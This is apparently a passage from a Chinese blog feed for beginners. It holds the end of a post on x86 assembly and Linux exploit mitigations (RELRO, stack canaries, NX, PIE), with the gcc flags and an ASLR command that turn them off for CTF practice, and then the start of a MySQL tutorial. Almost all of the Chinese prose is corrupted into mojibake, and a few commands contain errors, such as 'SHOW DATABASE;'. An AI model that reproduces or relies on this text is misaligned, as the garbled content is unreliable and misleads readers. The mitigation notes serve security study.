%edi<br>calladd_a_and_b<br>popq%rbp<br>.cfi_def_cfa 7, 8<br>ret<br>.cfi_endproc<br>.LFE1:<br>.sizemain, .-main<br>.ident&quot;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609&quot;<br>.section.note.GNU-stack,&quot;&quot;,@progbits<br></code></pre></td></tr></table></figure><blockquote><p>ä»¥æˆ‘ç°åœ¨çš„æ°´å¹³è¿˜ä¸æ˜¯å¾ˆèƒ½çœ‹æ˜ç™½ï¼Œæˆ‘å°±æ˜¯æŠŠæ–‡ä»¶å…¨å¤åˆ¶ä¸‹æ¥äº†</p></blockquote><p>ç®€åŒ–ä»¥åä¸»è¦å°±æ˜¯è¿™äº›å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86">_add_a_and_b:<br>   push   %ebx<br>   mov    %eax, [%esp+8] <br>   mov    %ebx, [%esp+12]<br>   add    %eax, %ebx <br>   pop    %ebx <br>   ret  <br><br>_main:<br>   push   3<br>   push   2<br>   call   _add_a_and_b <br>   add    %esp, 8<br>   ret<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åŸç¨‹åºä¸¤ä¸ªå‡½æ•°<code>add_a_and_b</code>å’Œ<code>main</code>å¯¹åº”ä¸Šé¢çš„ä¸¤ä¸ªæ ‡ç­¾<code>_add_a_and_b</code>å’Œ<code>_main</code>ï¼Œæ¯ä¸ªæ ‡ç­¾é‡Œé¢æ˜¯è¯¥å‡½æ•°æ‰€è½¬æˆçš„ CPU è¿è¡Œæµç¨‹ï¼Œæ¯ä¸€è¡Œå°±æ˜¯ CPU æ‰§è¡Œçš„ä¸€æ¬¡æ“ä½œã€‚</p><p>ä»¥å…¶ä¸­ä¸€è¡Œä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86">push   %ebx<br></code></pre></td></tr></table></figure><p>è¿™ä¸€è¡Œé‡Œé¢ï¼Œ<code>push</code>æ˜¯ CPU æŒ‡ä»¤ï¼Œ<code>%ebx</code>æ˜¯è¯¥æŒ‡ä»¤è¦ç”¨åˆ°çš„è¿ç®—å­ã€‚ä¸€ä¸ª CPU æŒ‡ä»¤å¯ä»¥æœ‰é›¶ä¸ªåˆ°å¤šä¸ªè¿ç®—å­ã€‚</p><h4 id="åŸºç¡€æŒ‡ä»¤"><a href="#åŸºç¡€æŒ‡ä»¤" class="headerlink" title="åŸºç¡€æŒ‡ä»¤"></a>åŸºç¡€æŒ‡ä»¤</h4><table><thead><tr><th>æ±‡ç¼–æŒ‡ä»¤</th><th>å®é™…ä½œç”¨</th><th>ç­‰ä»·ä»£ç </th></tr></thead><tbody><tr><td>mov rax,rbx</td><td>ç”¨äºèµ‹å€¼</td><td>rax&#x3D;rbx</td></tr><tr><td>add&#x2F;sub rax,rbx</td><td>ç”¨äºåŠ &#x2F;å‡æ³•</td><td>rax+&#x3D;rbx&#x2F;rax-&#x3D;rbx</td></tr><tr><td>and&#x2F;xor&#x2F;or rax,rbx</td><td>ç”¨äºä¸&#x2F;å¼‚æˆ–&#x2F;æˆ–</td><td>rax&amp;&#x3D;rbx&#x2F;rax^&#x3D;rbx&#x2F;rax</td></tr><tr><td>push rax</td><td>å‹æ ˆ</td><td>rsp-&#x3D;8;*rsp&#x3D;rax</td></tr><tr><td>pop rax</td><td>å‡ºæ ˆ</td><td>rax&#x3D;*rsp;rsp+&#x3D;8</td></tr><tr><td>call rax</td><td>è°ƒç”¨å‡½æ•°</td><td>push rip;jmp rax;</td></tr><tr><td>ret</td><td>ä»å‡½æ•°è¿”å›</td><td>pop rip;</td></tr><tr><td>cmp rax,rbx</td><td>æ¯”è¾ƒä¸¤ä¸ªæ•°ã€‚ä¸ä¿ç•™ç»“æœ,åªä¿®æ”¹flagså¯„å­˜å™¨</td><td>rax-rbx</td></tr><tr><td>test rax,rbx</td><td>æ¯”è¾ƒä¸¤ä¸ªæ•°ã€‚ä¸ä¿ç•™ç»“æœ,åªä¿®æ”¹flagså¯„å­˜å™¨</td><td>rax&amp;rbx</td></tr></tbody></table><h4 id="è·³è½¬æŒ‡ä»¤"><a href="#è·³è½¬æŒ‡ä»¤" class="headerlink" title="è·³è½¬æŒ‡ä»¤"></a>è·³è½¬æŒ‡ä»¤</h4><table><thead><tr><th>æ±‡ç¼–æŒ‡ä»¤ç¤ºä¾‹</th><th>è‹±æ–‡å…¨ç§°</th><th>å®é™…ä½œç”¨</th></tr></thead><tbody><tr><td>jmp</td><td>jump</td><td>è·³è½¬</td></tr><tr><td>jz</td><td>jump if zero</td><td>ä¸º0æ—¶è·³è½¬</td></tr><tr><td>jnz</td><td>jump if not zero</td><td>ä¸ä¸ºé›¶æ—¶è·³è½¬</td></tr><tr><td>jg</td><td>jump if greater</td><td>æœ‰ç¬¦å·æ•°å¤§äºè·³è½¬</td></tr><tr><td>jl</td><td>jump if lsee</td><td>æœ‰ç¬¦å·æ•°å°äºè·³è½¬</td></tr></tbody></table><p>è·³è½¬æŒ‡ä»¤ä¸åŒäº mov æŒ‡ä»¤ï¼Œä»–å¯ä»¥ç”¨äºä¿®æ”¹æ®µå¯„å­˜å™¨ csã€ip çš„å€¼ï¼Œä»è€Œä¿®æ”¹ CPU åœ¨å†…å­˜ä¸­æ‰€è¯»å–çš„å†…å®¹çš„åœ°å€ã€‚</p><p><del>è¡¨æ ¼æ˜¯ä»å°å“çš„åšå®¢copyæ¥çš„</del></p><h1 id="Linuxå¸¸ç”¨ä¿æŠ¤æœºåˆ¶"><a href="#Linuxå¸¸ç”¨ä¿æŠ¤æœºåˆ¶" class="headerlink" title="Linuxå¸¸ç”¨ä¿æŠ¤æœºåˆ¶"></a>Linuxå¸¸ç”¨ä¿æŠ¤æœºåˆ¶</h1><p>æ“ä½œç³»ç»Ÿæä¾›äº†è®¸å¤šå®‰å…¨æœºåˆ¶æ¥å°è¯•é™ä½æˆ–é˜»æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»å¸¦æ¥çš„å®‰å…¨é£é™©ã€‚åœ¨ç¼–å†™æ¼æ´åˆ©ç”¨ä»£ç çš„æ—¶å€™ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„ç›®æ ‡è¿›ç¨‹æ˜¯å¦å¼€å¯äº† ä¿æŠ¤æœºåˆ¶</p><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>è¿™ä¸æ˜¯ä¸ªä¿æŠ¤æœºåˆ¶æ˜¯ä¸ªè„šæœ¬è½¯ä»¶ã€‚</p><p>checksecç”¨æ¥æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶çš„å±æ€§ï¼ŒæŸ¥çœ‹æ–‡ä»¶å¼€å¯äº†å“ªäº›ä¿æŠ¤æœºåˆ¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">checksec [filename]<br></code></pre></td></tr></table></figure><p>ä»¥ä¹‹å‰ä¸€é“ Pwn é¢˜é¢˜ç›®ä¸ºä¾‹ï¼š<br><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_21-08-51.png"></p><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><h4 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h4><p>RELROå³ä¸ºread only relocationï¼Œå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬ç†Ÿæ‚‰çš„windowsç³»ç»Ÿé‡Œçš„åªè¯»ã€‚</p><p>è®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹ GOTï¼ˆGlobal Offset Tableï¼‰æ”»å‡»ã€‚</p><h4 id="å‚æ•°è®¾ç½®"><a href="#å‚æ•°è®¾ç½®" class="headerlink" title="å‚æ•°è®¾ç½®"></a>å‚æ•°è®¾ç½®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o hello test.c // é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯Partial RELRO<br>gcc -z norelro -o hello test.c // å…³é—­ï¼Œå³No RELRO<br>gcc -z lazy -o hello test.c // éƒ¨åˆ†å¼€å¯ï¼Œå³Partial RELRO<br>gcc -z now -o hello test.c // å…¨éƒ¨å¼€å¯ï¼Œå³Full RELRO<br></code></pre></td></tr></table></figure><h3 id="CANNARYï¼ˆæ ˆä¿æŠ¤ï¼‰"><a href="#CANNARYï¼ˆæ ˆä¿æŠ¤ï¼‰" class="headerlink" title="CANNARYï¼ˆæ ˆä¿æŠ¤ï¼‰"></a>CANNARYï¼ˆæ ˆä¿æŠ¤ï¼‰</h3><h4 id="ä»‹ç»-2"><a href="#ä»‹ç»-2" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h4><p>æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®© shellcode èƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚</p><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥ cookie ä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯ cookie ä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°† cookie ä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢ shellcode çš„æ‰§è¡Œã€‚</p><p>åœ¨ Linux ä¸­æˆ‘ä»¬å°† cookie ä¿¡æ¯ç§°ä¸º canaryã€‚</p><h4 id="å‚æ•°è®¾ç½®-1"><a href="#å‚æ•°è®¾ç½®-1" class="headerlink" title="å‚æ•°è®¾ç½®"></a>å‚æ•°è®¾ç½®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -fstack-protector å¯ç”¨ä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤<br>gcc -fstack-protector-all å¯ç”¨ä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤<br>gcc -fstack-protector-strong<br>gcc -fstack-protector-explicit åªå¯¹æœ‰æ˜ç¡®stack_protect attribute çš„å‡½æ•°å¼€å¯ä¿æŠ¤<br>gcc -fno-stack-protector ç¦ç”¨ä¿æŠ¤<br></code></pre></td></tr></table></figure><h3 id="NX-DEP"><a href="#NX-DEP" class="headerlink" title="NX(DEP)"></a>NX(DEP)</h3><h4 id="ä»‹ç»-3"><a href="#ä»‹ç»-3" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h4><p>NX å³ No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰ï¼ŒNXï¼ˆDEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥ shellcode æ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶ CPU å°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</p><h4 id="å‚æ•°è®¾ç½®-2"><a href="#å‚æ•°è®¾ç½®-2" class="headerlink" title="å‚æ•°è®¾ç½®"></a>å‚æ•°è®¾ç½®</h4><p>gcc ç¼–è¯‘å™¨é»˜è®¤å¼€å¯äº† NX é€‰é¡¹ï¼Œå¦‚æœéœ€è¦å…³é—­ NX é€‰é¡¹ï¼Œå¯ä»¥ç»™ gcc ç¼–è¯‘å™¨æ·»åŠ  - z execstack å‚æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o test test.c                    // é»˜è®¤æƒ…å†µä¸‹ï¼Œå¼€å¯NXä¿æŠ¤<br>gcc -z execstack -o test test.c        // ç¦ç”¨NXä¿æŠ¤<br>gcc -z noexecstack -o test test.c    // å¼€å¯NXä¿æŠ¤<br></code></pre></td></tr></table></figure><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><h4 id="ä»‹ç»-4"><a href="#ä»‹ç»-4" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h4><p>PIEå³Position-Independent Executableï¼ˆ ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ï¼Œä¸ASLR æŠ€æœ¯ç±»ä¼¼ã€‚</p><p>ASLR å°†ç¨‹åºè¿è¡Œæ—¶çš„å †æ ˆä»¥åŠå…±äº«åº“çš„åŠ è½½åœ°å€éšæœºåŒ–ï¼Œè€Œ PIE æŠ€æœ¯åˆ™åœ¨ç¼–è¯‘æ—¶å°†ç¨‹åºç¼–è¯‘ä¸ºä½ç½®æ— å…³ï¼Œå³ç¨‹åºè¿è¡Œæ—¶å„ä¸ªæ®µï¼ˆå¦‚ä»£ç æ®µç­‰ï¼‰åŠ è½½çš„è™šæ‹Ÿåœ°å€ä¹Ÿæ˜¯åœ¨è£…è½½æ—¶æ‰ç¡®å®šã€‚</p><p>è¿™å°±æ„å‘³ç€ï¼Œåœ¨ PIE å’Œ ASLR åŒæ—¶å¼€å¯çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å°†å¯¹ç¨‹åºçš„å†…å­˜å¸ƒå±€ä¸€æ— æ‰€çŸ¥ï¼Œä¼ ç»Ÿçš„æ”¹å†™GOT è¡¨é¡¹çš„æ–¹æ³•ä¹Ÿéš¾ä»¥è¿›è¡Œï¼Œå› ä¸ºæ”»å‡»è€…ä¸èƒ½è·å¾—ç¨‹åºçš„.got æ®µçš„è™šåœ°å€ã€‚</p><p>liunx ä¸‹å…³é—­ PIE çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure><h4 id="å‚æ•°è®¾ç½®-3"><a href="#å‚æ•°è®¾ç½®-3" class="headerlink" title="å‚æ•°è®¾ç½®"></a>å‚æ•°è®¾ç½®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o test test.c       // é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯PIE<br>gcc -fpie -pie -o test test.c        // å¼€å¯PIEï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1<br>gcc -fPIE -pie -o test test.c        // å¼€å¯PIEï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2<br>gcc -fpic -o test test.c        // å¼€å¯PICï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1ï¼Œä¸ä¼šå¼€å¯PIE<br>gcc -fPIC -o test test.c        // å¼€å¯PICï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2ï¼Œä¸ä¼šå¼€å¯PIE<br></code></pre></td></tr></table></figure><hr><p>æ‚ä¸ƒæ‚å…«å¿™äº†ä¸€ä¸ªå‘¨ï¼ŒæŠ½æ—¶é—´å­¦äº†è¿™ä¹ˆç‚¹ä¸œè¥¿ã€‚æˆ‘æ˜¯èœé¸¡ğŸ¥¬</p><p>æœ‰çœ‹å‡ é“pwné¢˜ï¼Œå‘ç°å¤§éƒ¨åˆ†é¢˜ç›®éƒ½æ˜¯éœ€è¦ä¸€äº›é€†å‘æŠ€å·§çš„ï¼Œæœ‰äº›è¿˜ä¼šå’Œwebç»“åˆ <del>éå¸¸ç–¯ç‹‚</del></p><p>å¦‚æœæœ‰ç©ºwebä¸€äº›åŸºç¡€çš„ä¸œè¥¿æˆ‘è¿˜æ˜¯ä¼šç»§ç»­å­¦çš„ï¼Œå°±ç†¬å¤œå§ç†¬å¤œå§ğŸ¤ª</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>ubuntu</tag>
      
      <tag>x86æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQLæ•°æ®åº“åŸºç¡€</title>
    <link href="/2023/03/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>åˆåï¼šå­¦äº†å°±å¿˜åªèƒ½å†çœ‹ä»å¤´é‡å­¦ğŸ˜£</p><span id="more"></span><h1 id="01-phpstudyä¸­MySQLçš„ç®€å•ä½¿ç”¨"><a href="#01-phpstudyä¸­MySQLçš„ç®€å•ä½¿ç”¨" class="headerlink" title="01 phpstudyä¸­MySQLçš„ç®€å•ä½¿ç”¨"></a>01 phpstudyä¸­MySQLçš„ç®€å•ä½¿ç”¨</h1><p>åœ¨å­¦ç”¨MySQLçš„æ—¶å€™å‘ç°è‡ªå·±å’Œå­¦ä¹ èµ„æ–™ç”¨çš„ä¸æ˜¯åŒä¸€ä¸ªé›†æˆç¯å¢ƒï¼Œæ‰€ä»¥æ‰“å¼€æ–¹å¼ä¸ä¸€æ ·ï¼Œè¿™ç§å°é—®é¢˜è¿˜æ˜¯éš¾ä¸å€’æˆ‘å“’ğŸ˜</p><p>é¦–å…ˆå¼€å¯MySQLæœåŠ¡    <del>å¥½äº†æ¥ä¸‹æ¥å°±ä¸ä¼šäº†</del></p><p>å†å»å°çš®å®˜ç½‘çœ‹çœ‹</p><p>æœ‰ä¸€ä¸ªæ¨¡å—æ˜¯phpMyAdminçš„ä½¿ç”¨ã€‚æŒ‰ç…§å®˜æ–¹æ•™ç¨‹ä¸‹è½½å¥½æ‰“å¼€æˆ‘æ‰å‘ç°è¿™æ˜¯åœ¨ç½‘é¡µä¸Šæ“ä½œï¼Œä¸æ˜¯å‘½ä»¤è¡Œã€‚æ²¡å…³ç³»ï¼Œä¸‹è½½éƒ½ä¸‹è½½äº†ï¼Œå­¦ä¹ ä¸€ä¸‹ã€‚</p><h4 id="001-å›¾å½¢åŒ–ç•Œé¢æ“ä½œ"><a href="#001-å›¾å½¢åŒ–ç•Œé¢æ“ä½œ" class="headerlink" title="001 å›¾å½¢åŒ–ç•Œé¢æ“ä½œ"></a>001 å›¾å½¢åŒ–ç•Œé¢æ“ä½œ</h4><p>åœ¨è½¯ä»¶ç®¡ç†æ‰¾åˆ°<strong>phpMyAdmin</strong>ï¼Œç‚¹å‡»ä¸‹è½½ã€‚ä¸‹è½½å®Œä¹‹åç‚¹ç®¡ç†å°±ä¼šè‡ªåŠ¨åœ¨æµè§ˆå™¨æ‰“å¼€ï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç å°±å¯ä»¥ä½¿ç”¨å•¦ã€‚</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-29-51.png"></p><p>ç”¨æˆ·åå’Œå¯†ç æ²¡æ”¹è¿‡çš„è¯å°±éƒ½æ˜¯<strong>root</strong></p><p>åœ¨phpMyAdminä¹Ÿå¯ä»¥ç”¨SQLæŸ¥è¯¢è¯­å¥å—·</p><blockquote><p>è¾“å…¥SELECT id FROM test ;</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-48-13.png"></p><p>ä½¿ç”¨å…¶ä»–ç•Œé¢æ“ä½œå†…å®¹æ—¶ä¹Ÿå¯ä»¥é¢„è§ˆSQLè¯­å¥</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-51-03.png"></p><p>æ€»ä¹‹å°±æ˜¯å¾ˆç®€å•æ˜“ä¸Šæ‰‹è¾£ğŸ˜‡</p><p><del>è¿æˆ‘éƒ½å¯ä»¥æ— å¸ˆè‡ªé€š</del></p><h4 id="002-cmdæ“ä½œ"><a href="#002-cmdæ“ä½œ" class="headerlink" title="002 cmdæ“ä½œ"></a>002 cmdæ“ä½œ</h4><blockquote><p>MySQLåœ¨phpstudy_proæ–‡ä»¶ä¸‹çš„Extensionsæ–‡ä»¶å¤¹é‡Œ</p></blockquote><p>è¿›å…¥binç›®å½•ååœ¨æ­¤å¤„æ‰“å¼€cmd</p><p>è¾“å…¥<code>mysql -u[ç”¨æˆ·å] -p[å¯†ç ] -h [æ•°æ®åº“æœåŠ¡å™¨åœ°å€]</code>è¿›å…¥</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-28-33.png"></p><p>ç”¨æˆ·åå’Œå¯†ç æ²¡æ”¹è¿‡çš„è¯å°±éƒ½æ˜¯<strong>root</strong>ï¼Œæ‰“å¼€æœ¬åœ°æ•°æ®åº“å¯ä»¥ä¸åŠ æœåŠ¡å™¨åœ°å€</p><p>è¿›å…¥mysqlä¹‹åå°±å¯ä»¥å¿«ä¹ä½¿ç”¨äº†</p><h1 id="02-å…³äºMySQL"><a href="#02-å…³äºMySQL" class="headerlink" title="02 å…³äºMySQL"></a>02 å…³äºMySQL</h1><h4 id="001-MySQLå¸¸è§ç¬¦å·"><a href="#001-MySQLå¸¸è§ç¬¦å·" class="headerlink" title="001 MySQLå¸¸è§ç¬¦å·"></a>001 MySQLå¸¸è§ç¬¦å·</h4><h5 id="gt"><a href="#gt" class="headerlink" title="-&gt;"></a>-&gt;</h5><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_17-29-23.png"></p><p>è¡¨ç¤ºå½“å‰å‘½ä»¤æ²¡æœ‰å‘½ä»¤æ‰§è¡Œç¬¦æˆ–è€…ç­‰å¾…å‘½ä»¤æ‰§è¡Œç¬¦<code>;</code>æˆ–<code>\g</code>ï¼Œä¹Ÿå¯ä»¥è¾“å…¥<code>\c</code>å–æ¶ˆå‘½ä»¤ç›´æ¥è¾“å…¥<code>;</code>å›è½¦å³å¯æ‰§è¡Œå‘½ä»¤ã€‚</p><h5 id="â€˜-gt-æˆ–â€-gt"><a href="#â€˜-gt-æˆ–â€-gt" class="headerlink" title="â€˜&gt;æˆ–â€&gt;"></a>â€˜&gt;æˆ–â€&gt;</h5><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_17-33-39.png"></p><p>è¡¨ç¤ºå½“å‰å‘½ä»¤ç¼ºå°‘<code>&#39;</code>æˆ–<code>&quot;</code></p><h4 id="002-MySQLç¼–ç è§„èŒƒ"><a href="#002-MySQLç¼–ç è§„èŒƒ" class="headerlink" title="002 MySQLç¼–ç è§„èŒƒ"></a>002 MySQLç¼–ç è§„èŒƒ</h4><ul><li><p>å…³é”®å­—ä¸å‡½æ•°åç§°å…¨éƒ¨å¤§å†™ï¼›ï¼ˆä¸å¤§å†™ä¹Ÿå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼‰</p></li><li><p>æ•°æ®åº“åç§°ã€è¡¨åã€å­—æ®µåç§°å…¨éƒ¨å°å†™ï¼›</p></li><li><p>å¿…é¡»ä»¥åˆ†å·ç»“å°¾</p></li></ul><h4 id="003-ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€"><a href="#003-ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€" class="headerlink" title="003 ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€"></a>003 ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€</h4><p>ä¸»è¦åˆ†ä¸ºå››ç±»</p><p>DDL-æ•°æ®åº“å®šä¹‰è¯­è¨€ï¼ˆCREATE DROP ALTER)</p><p>DML-æ•°æ®åº“æ“ä½œè¯­è¨€ï¼ˆINSERT DELETE UPDATE)</p><p>DQL-æ•°æ®åº“æŸ¥è¯¢è¯­è¨€ï¼ˆSELECT WHERE)</p><p>DCL-æ•°æ®åº“æ§åˆ¶è¯­è¨€</p><p><del>è¯´äº†è¿™ä¹ˆå¤šä¹Ÿæ²¡ä»€ä¹ˆç”¨</del>ğŸ¤ª</p><h1 id="03-SQLè¯­æ³•"><a href="#03-SQLè¯­æ³•" class="headerlink" title="03 SQLè¯­æ³•"></a>03 SQLè¯­æ³•</h1><h3 id="å¯¹åº“çš„æ“ä½œ"><a href="#å¯¹åº“çš„æ“ä½œ" class="headerlink" title="å¯¹åº“çš„æ“ä½œ"></a>å¯¹åº“çš„æ“ä½œ</h3><h5 id="æŸ¥æ‰¾åº“"><a href="#æŸ¥æ‰¾åº“" class="headerlink" title="æŸ¥æ‰¾åº“"></a>æŸ¥æ‰¾åº“</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW DATABASE; <br></code></pre></td></tr></table></figure><h5 id="åˆ›å»ºåº“"><a href="#åˆ›å»ºåº“" class="headerlink" title="åˆ›å»ºåº“"></a>åˆ›å»ºåº“</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE [database_name];<br></code></pre></td></tr></table></figure><p>ä¸çŸ¥é“å³å°†åˆ›å»ºçš„åº“æ˜¯å¦å­˜åœ¨æ—¶ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼šå¦‚æœåº“ä¸å­˜åœ¨å°±åˆ›å»ºï¼Œå­˜åœ¨åˆ™é€€å‡ºå‘½ä»¤</p><p><code>CREATE DATABASE IF NOT EXISTS [database_name];</code></p><blockquote><p>ä½†ä¸å»ºè®®è®©MySQLæ¥åšåˆ¤æ–­</p></blockquote><h5 id="åˆ é™¤åº“"><a href="#åˆ é™¤åº“" class="headerlink" title="åˆ é™¤åº“"></a>åˆ é™¤åº“</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP DATABASE [database_name];<br></code></pre></td></tr></table></figure><p><strong>æ•°æ®åº“ä¸èƒ½ä¿®æ”¹åå­—</strong></p><h3 id="å¯¹è¡¨çš„æ“ä½œ"><a href="#å¯¹è¡¨çš„æ“ä½œ" class="headerlink" title="å¯¹è¡¨çš„æ“ä½œ"></a>å¯¹è¡¨çš„æ“ä½œ</h3><h5 id="æŸ¥æ‰¾è¡¨"><a href="#æŸ¥æ‰¾è¡¨" class="headerlink" title="æŸ¥æ‰¾è¡¨"></a>æŸ¥æ‰¾è¡¨</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW TABLES;         //æŸ¥æ‰¾å½“å‰åº“çš„æ‰€æœ‰è¡¨<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-25-02.png"></p><h5 id="åˆ›å»ºè¡¨"><a href="#åˆ›å»ºè¡¨" class="headerlink" 